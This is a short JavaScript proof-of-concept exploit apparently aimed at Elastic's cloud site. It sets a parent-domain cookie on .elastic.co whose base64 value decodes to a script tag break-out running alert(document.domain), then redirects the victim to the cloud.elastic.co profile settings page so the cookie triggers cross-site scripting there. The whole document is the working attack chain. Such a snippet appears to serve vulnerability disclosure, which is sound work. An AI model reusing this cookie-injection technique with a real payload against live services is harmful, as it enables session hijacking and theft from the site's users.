document.body.innerHTML = `
    <button onclick="go()">Click Me</button>
`;
function go() {
    document.cookie = "vulnerableCookie=LS0+PC9zY3JpcHQ+PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pOy8vIA==; path=/; domain=.elastic.co;";
    window.location = "https://cloud.elastic.co/user/settings/profile";
}
